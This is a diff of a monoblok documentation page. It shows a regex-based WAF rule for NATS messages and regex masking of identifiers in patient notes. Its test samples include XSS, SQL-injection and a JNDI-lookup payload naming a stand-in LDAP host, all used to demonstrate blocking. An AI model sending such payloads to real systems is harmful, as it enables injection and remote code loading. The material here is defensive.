@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Filtering and privacy | monoblok docs</title>
-<meta name="description" content="Patchbays that decide what may leave: a WAF for NATS with payload scanning, a p99 outlier gate and flood detection, and de-identification of patient records.">
+<meta name="description" content="Patchbays that decide what may leave: a WAF for NATS with regex payload scanning, a p99 outlier gate and flood detection, and de-identification of patient records.">
 <meta name="theme-color" content="#f5f4ed">
 <link rel="stylesheet" href="docs.css?v=93523c2c9a1c">
 </head>
@@ -28,7 +28,7 @@
 <article class="docs-article">
 <p class="kicker">Examples</p>
 <h1>Filtering and privacy</h1>
-<p class="lede">Most examples reshape a stream. These decide what is allowed through: a WAF for NATS that scans payloads, holds back readings above the rolling p99 and flags a flooding subject, and a patchbay that strips identifiers from patient records before they are forwarded.</p>
+<p class="lede">Most examples reshape a stream. These decide what is allowed through: a WAF for NATS that scans payloads with a regular expression, holds back readings above the rolling p99 and flags a flooding subject, and a patchbay that strips and masks identifiers in patient records before they are forwarded.</p>
 <h2 id="a-waf-for-nats">A WAF for NATS<a class="anchor" href="#a-waf-for-nats" aria-label="Link to this section">#</a></h2>
 <p><span class="tag tag-intermediate">Intermediate</span> A web application firewall sits in front of a web server and decides which requests get through. This patchbay does the same job for a NATS cluster. Publishers connect to monoblok instead of the cluster and publish under <code>in.&gt;</code>; three rules decide what continues as <code>clean.&gt;</code> and what is reported on <code>waf.&gt;</code>.</p>
 <figure class="code"><figcaption><span><a href="https://github.com/lexvicacom/monoblok/blob/main/examples/waf.edn" target="_blank" rel="noopener noreferrer">examples/waf.edn</a></span></figcaption><pre><code><span class="tok-com">;; A WAF for NATS: three rules that decide which messages are allowed</span>
@@ -46,10 +46,12 @@
 <span class="tok-com">;; Payload scan. An event carrying a known-bad fragment is not</span>
 <span class="tok-com">;; forwarded; its subject (never its payload) is reported on</span>
 <span class="tok-com">;; `waf.blocked`. Everything else moves from in.event.* to clean.event.*.</span>
+<span class="tok-com">;; The test is one case-insensitive regular expression (the regex forms</span>
+<span class="tok-com">;; are experimental): a script tag, a `${jndi:` lookup, or DROP TABLE</span>
+<span class="tok-com">;; with any run of whitespace between the words. #"..." is EDN's raw</span>
+<span class="tok-com">;; string, so backslashes are written as the regex wants them.</span>
 (<span class="tok-op">on</span> <span class="tok-str">"in.event.*"</span>
-  (<span class="tok-op">if</span> (<span class="tok-op">or</span> (<span class="tok-op">contains?</span> payload <span class="tok-str">"&lt;script"</span>)
-          (<span class="tok-op">contains?</span> payload <span class="tok-str">"${jndi:"</span>)
-          (<span class="tok-op">contains?</span> payload <span class="tok-str">"DROP TABLE"</span>))
+  (<span class="tok-op">if</span> (<span class="tok-op">matches?</span> <span class="tok-str">#"(?i)&lt;script|\$\{jndi:|drop\s+table"</span> payload)
     (<span class="tok-op">publish!</span> <span class="tok-str">"waf.blocked"</span> subject)
     (<span class="tok-op">publish!</span> (<span class="tok-op">subject-with</span> <span class="tok-str">"clean.event"</span> (<span class="tok-op">subject-token</span> <span class="tok-num">2</span>)) payload)))
 
@@ -74,7 +76,8 @@
 <figure class="code"><figcaption><span>shell</span></figcaption><pre><code>examples/waf.sh</code></pre></figure>
 <p>Rules see a message's subject and payload. They do not see which connection published it, so every decision here is per subject, not per client.</p>
 <h3 id="payload-scan">Payload scan<a class="anchor" href="#payload-scan" aria-label="Link to this section">#</a></h3>
-<p>The first rule is stateless. <a href="forms.html#strings-and-subjects"><code>contains?</code></a> is a substring test, <code>or</code> stops at the first hit, and <code>if</code> sends the message one of two ways. A blocked event is not forwarded and its payload is not repeated: <code>waf.blocked</code> carries only the subject it arrived on, so one subscriber sees every block without receiving the content that caused it.</p>
+<blockquote><p><strong>Experimental.</strong> The regex forms used here, <code>matches?</code>, <code>re-capture</code> and <code>re-replace</code>, are new; the forms and pattern syntax may change between releases.</p></blockquote>
+<p>The first rule is stateless. <a href="forms.html#regular-expressions"><code>matches?</code></a> tests the payload against one case-insensitive pattern, and <code>if</code> sends the message one of two ways. The <code>(?i)</code> prefix ignores case, <code>\s+</code> accepts any run of whitespace between <code>drop</code> and <code>table</code>, and the three alternatives are a script tag, a <code>${jndi:</code> lookup and a table drop. A blocked event is not forwarded and its payload is not repeated: <code>waf.blocked</code> carries only the subject it arrived on, so one subscriber sees every block without receiving the content that caused it.</p>
 <figure class="code"><figcaption><span>soundcheck · <a href="https://github.com/lexvicacom/monoblok/blob/main/examples/waf.edn" target="_blank" rel="noopener noreferrer">examples/waf.edn</a></span></figcaption><pre><code><span class="sc-in">in   in.event.orders  {"note":"leave at the door"}</span>
 <span class="sc-out">out  clean.event.orders  {"note":"leave at the door"}</span>
 <span class="sc-in">in   in.event.orders  {"note":"&lt;script&gt;alert(1)&lt;/script&gt;"}</span>
@@ -82,8 +85,14 @@
 <span class="sc-in">in   in.event.signup  {"name":"Ada"}</span>
 <span class="sc-out">out  clean.event.signup  {"name":"Ada"}</span>
 <span class="sc-in">in   in.event.signup  {"name":"x; DROP TABLE users"}</span>
-<span class="sc-out">out  waf.blocked  in.event.signup</span></code></pre></figure>
-<p>This is plain substring matching: no regular expressions, no decoding and no case folding, so <code>drop table</code> in lower case passes. Treat the rule as a cheap first filter, not a full inspection layer.</p>
+<span class="sc-out">out  waf.blocked  in.event.signup</span>
+<span class="sc-in">in   in.event.orders  {"note":"&lt;SCRIPT src=x&gt;"}</span>
+<span class="sc-out">out  waf.blocked  in.event.orders</span>
+<span class="sc-in">in   in.event.signup  {"name":"x; drop   table users"}</span>
+<span class="sc-out">out  waf.blocked  in.event.signup</span>
+<span class="sc-in">in   in.event.orders  {"note":"${jndi:ldap://host/a}"}</span>
+<span class="sc-out">out  waf.blocked  in.event.orders</span></code></pre></figure>
+<p>The pattern is a string literal, written <code>#"\s+"</code> in EDN and <code>'\s+'</code> in a <code>.yml</code> file. There is no decoding, so a payload that hides <code>&lt;script</code> behind URL or HTML escapes passes. Treat the rule as a cheap first filter, not a full inspection layer.</p>
 <h3 id="outlier-gate">Outlier gate<a class="anchor" href="#outlier-gate" aria-label="Link to this section">#</a></h3>
 <p>The second rule forwards a reading only while it is at or below the <a href="forms.html#rate-percentiles-distribution-shape"><code>percentile</code></a> of the last 100 readings from that device. There is no fixed limit to maintain: each device learns its own normal, because state is per subject.</p>
 <figure class="code"><figcaption><span>soundcheck · <a href="https://github.com/lexvicacom/monoblok/blob/main/examples/waf.edn" target="_blank" rel="noopener noreferrer">examples/waf.edn</a></span></figcaption><pre><code><span class="sc-in">in   in.reading.pump7  412</span>
@@ -144,11 +153,13 @@
 <span class="tok-com">;;   {"name":"Ada Example","mrn":"000-11-2222","age":47,"hr":72,"spo2":97}</span>
 <span class="tok-com">;; and nurses' free-text notes on notes.&lt;ward&gt;.</span>
 <span class="tok-com">;;</span>
-<span class="tok-com">;; Patchbay has no hashing or in-place masking form, so nothing here</span>
-<span class="tok-com">;; scrambles a value. The rules de-identify by leaving things out: they</span>
+<span class="tok-com">;; Structured frames are de-identified by leaving things out: the rules</span>
 <span class="tok-com">;; name the fields that may leave, coarsen the ones that identify, and</span>
 <span class="tok-com">;; drop the patient token from the subject. Anything not named stays</span>
-<span class="tok-com">;; behind, including fields added to the frame later.</span>
+<span class="tok-com">;; behind, including fields added to the frame later. Free-text notes</span>
+<span class="tok-com">;; cannot be allow-listed, so they are masked with regular expressions</span>
+<span class="tok-com">;; instead (experimental, see the last two rules). Patchbay has no</span>
+<span class="tok-com">;; hashing form, so no value is turned into a pseudonym.</span>
 <span class="tok-com">;;</span>
 <span class="tok-com">;; Only `clean.&gt;` and `phi.&gt;` are meant to leave this box. Pair the file</span>
 <span class="tok-com">;; with (export :export ["clean.&gt;" "phi.&gt;"]) or an (import ...) tap.</span>
@@ -175,15 +186,28 @@
 (<span class="tok-op">on</span> <span class="tok-str">"clean.*.hr"</span>
   (<span class="tok-op">publish!</span> (<span class="tok-op">subject-append</span> <span class="tok-str">"avg"</span>) <span class="tok-kw">:dp</span> <span class="tok-num">0</span> (<span class="tok-op">moving-avg</span> <span class="tok-num">20</span> payload-float)))
 
-<span class="tok-com">;; Tripwire. Free text cannot be allow-listed field by field, so hold</span>
-<span class="tok-com">;; any note that mentions an identifier label. The hold message carries</span>
-<span class="tok-com">;; the subject, never the note itself.</span>
-(<span class="tok-op">on</span> <span class="tok-str">"notes.*"</span>
-  (<span class="tok-op">if</span> (<span class="tok-op">or</span> (<span class="tok-op">contains?</span> payload <span class="tok-str">"MRN"</span>)
-          (<span class="tok-op">contains?</span> payload <span class="tok-str">"DOB"</span>)
-          (<span class="tok-op">contains?</span> payload <span class="tok-str">"NHS"</span>))
-    (<span class="tok-op">publish!</span> <span class="tok-str">"phi.held"</span> subject)
-    (<span class="tok-op">publish!</span> (<span class="tok-op">subject-with</span> <span class="tok-str">"clean.notes"</span> (<span class="tok-op">subject-token</span> <span class="tok-num">1</span>)) payload)))</code></pre></figure>
+<span class="tok-com">;; Mask. Free text cannot be allow-listed field by field, so replace</span>
+<span class="tok-com">;; the identifier shapes we know about: a record number like</span>
+<span class="tok-com">;; 000-11-2222 becomes [MRN], and a date like 3/4/1980 becomes [DATE].</span>
+<span class="tok-com">;; The regex forms are experimental. Masking only catches the shapes</span>
+<span class="tok-com">;; written here: a name, an address or a record number in another format</span>
+<span class="tok-com">;; passes straight through. The rule is re-entrant so the masked text,</span>
+<span class="tok-com">;; published on `masked.notes.&lt;ward&gt;` (which is not exported), feeds the</span>
+<span class="tok-com">;; next rule.</span>
+(<span class="tok-op">on</span> <span class="tok-str">"notes.*"</span> <span class="tok-kw">:reentrant</span> true
+  (<span class="tok-op">-&gt;</span> payload
+      (<span class="tok-op">re-replace</span> <span class="tok-str">#"\b\d{3}-\d{2}-\d{4}\b"</span> <span class="tok-str">"[MRN]"</span>)
+      (<span class="tok-op">re-replace</span> <span class="tok-str">#"\b\d{1,2}/\d{1,2}/\d{2,4}\b"</span> <span class="tok-str">"[DATE]"</span>)
+      (<span class="tok-op">publish!</span> (<span class="tok-op">subject-with</span> <span class="tok-str">"masked.notes"</span> (<span class="tok-op">subject-token</span> <span class="tok-num">1</span>)))))
+
+<span class="tok-com">;; Tripwire. A note that still names an identifier label followed by</span>
+<span class="tok-com">;; something the masks did not cover ("MRN 4471", "DOB: unknown") is</span>
+<span class="tok-com">;; held whole, and only its subject is reported. Otherwise the masked</span>
+<span class="tok-com">;; note is forwarded.</span>
+(<span class="tok-op">on</span> <span class="tok-str">"masked.notes.*"</span>
+  (<span class="tok-op">if</span> (<span class="tok-op">matches?</span> <span class="tok-str">#"(?i)\b(?:mrn|dob|nhs)[ :=#]*[a-z0-9]"</span> payload)
+    (<span class="tok-op">publish!</span> <span class="tok-str">"phi.held"</span> (<span class="tok-op">subject-with</span> <span class="tok-str">"notes"</span> (<span class="tok-op">subject-token</span> <span class="tok-num">2</span>)))
+    (<span class="tok-op">publish!</span> (<span class="tok-op">subject-with</span> <span class="tok-str">"clean.notes"</span> (<span class="tok-op">subject-token</span> <span class="tok-num">2</span>)) payload)))</code></pre></figure>
 <figure class="code"><figcaption><span>soundcheck · <a href="https://github.com/lexvicacom/monoblok/blob/main/examples/deidentify.edn" target="_blank" rel="noopener noreferrer">examples/deidentify.edn</a></span></figcaption><pre><code><span class="sc-in">in   ward.icu.p4471  {"name":"Ada Example","mrn":"000-11-2222","age":47,"hr":72,"spo2":97}</span>
 <span class="sc-out">out  clean.icu.hr  72</span>
 <span class="sc-out">out  clean.icu.hr.avg  72</span>
@@ -195,12 +219,20 @@
 <span class="sc-out">out  clean.icu.spo2  93</span>
 <span class="sc-out">out  clean.icu.age-band  80</span>
 <span class="sc-in">in   notes.icu  Comfortable overnight, obs stable</span>
+<span class="sc-out">out  masked.notes.icu  Comfortable overnight, obs stable</span>
 <span class="sc-out">out  clean.notes.icu  Comfortable overnight, obs stable</span>
 <span class="sc-in">in   notes.icu  Call family re MRN 000-11-2222</span>
+<span class="sc-out">out  masked.notes.icu  Call family re MRN [MRN]</span>
+<span class="sc-out">out  clean.notes.icu  Call family re MRN [MRN]</span>
+<span class="sc-in">in   notes.icu  Discharge review booked, born 3/4/1980</span>
+<span class="sc-out">out  masked.notes.icu  Discharge review booked, born [DATE]</span>
+<span class="sc-out">out  clean.notes.icu  Discharge review booked, born [DATE]</span>
+<span class="sc-in">in   notes.icu  MRN 4471, check chart</span>
+<span class="sc-out">out  masked.notes.icu  MRN 4471, check chart</span>
 <span class="sc-out">out  phi.held  notes.icu</span></code></pre></figure>
 <p>What to notice:</p>
-<ul><li><strong>An allow-list, not a block-list.</strong> <a href="forms.html#json-payloads"><code>json-get</code></a> reads the fields the rule names. <code>name</code> and <code>mrn</code> are not removed; they are never read. A field the gateway starts sending next month is left behind too, where a pattern that hunts for identifiers would have to learn about it first. No regular expressions are involved.</li><li><strong>The subject is data too.</strong> <code>ward.icu.p4471</code> identifies a patient as surely as the name does. The rules publish under <code>clean.&lt;ward&gt;.…</code>, so every patient on a ward shares one output subject.</li><li><strong>Coarsen what identifies.</strong> <a href="forms.html#idempotent-filters"><code>quantize 10</code></a> snaps age to the nearest ten. <code>round</code> does the same job for coordinates.</li><li><strong>Aggregate where a total is enough.</strong> The ward average is a funnel: the first rule is <code>:reentrant true</code>, so its <code>clean.icu.hr</code> output feeds the <code>moving-avg</code> rule.</li><li><strong>Free text gets a tripwire.</strong> A note cannot be allow-listed field by field, so the last rule holds any note containing an identifier label and reports only the subject. This is substring matching: it catches <code>MRN 000-11-2222</code> and misses a bare number or a name.</li></ul>
-<p>This is de-identification by omission, not obfuscation. Patchbay has no hashing, tokenising or in-place masking form, so it cannot turn a record number into a stable pseudonym or forward a note with the digits starred out. If downstream needs to follow one patient across messages, issue the pseudonym at the gateway and put it in the subject. Rules like these reduce what leaves the ward; they are not a compliance control by themselves.</p>
+<ul><li><strong>An allow-list, not a block-list.</strong> <a href="forms.html#json-payloads"><code>json-get</code></a> reads the fields the rule names. <code>name</code> and <code>mrn</code> are not removed; they are never read. A field the gateway starts sending next month is left behind too, where a pattern that hunts for identifiers would have to learn about it first.</li><li><strong>The subject is data too.</strong> <code>ward.icu.p4471</code> identifies a patient as surely as the name does. The rules publish under <code>clean.&lt;ward&gt;.…</code>, so every patient on a ward shares one output subject.</li><li><strong>Coarsen what identifies.</strong> <a href="forms.html#idempotent-filters"><code>quantize 10</code></a> snaps age to the nearest ten. <code>round</code> does the same job for coordinates.</li><li><strong>Aggregate where a total is enough.</strong> The ward average is a funnel: the first rule is <code>:reentrant true</code>, so its <code>clean.icu.hr</code> output feeds the <code>moving-avg</code> rule.</li><li><strong>Free text gets masked, then checked.</strong> A note cannot be allow-listed field by field. The first notes rule uses <a href="forms.html#regular-expressions"><code>re-replace</code></a> (an experimental form) to swap a record number shaped like <code>000-11-2222</code> for <code>[MRN]</code> and a date like <code>3/4/1980</code> for <code>[DATE]</code>, then hands the masked text to a second rule through <code>masked.notes.&lt;ward&gt;</code>. That second rule holds any note that still names <code>MRN</code>, <code>DOB</code> or <code>NHS</code> followed by something the masks did not cover, such as <code>MRN 4471</code>, and reports only the subject.</li><li><strong>Masking only catches the shapes it is given.</strong> A name, an address, or a record number in another format passes straight through. The allow-list above is still the stronger tool wherever the data has fields.</li></ul>
+<p>Structured frames are de-identified by omission, not obfuscation. Patchbay has no hashing or tokenising form, so it cannot turn a record number into a stable pseudonym. If downstream needs to follow one patient across messages, issue the pseudonym at the gateway and put it in the subject. Rules like these reduce what leaves the ward; they are not a compliance control by themselves.</p>
 <figure class="code"><figcaption><span>shell</span></figcaption><pre><code>examples/deidentify.sh</code></pre></figure>
 <h2 id="making-it-a-gate">Making it a gate<a class="anchor" href="#making-it-a-gate" aria-label="Link to this section">#</a></h2>
 <p>The rules above only decide. What makes the patchbay a gate is that the raw subjects have no other way out. Two arrangements give you that:</p>
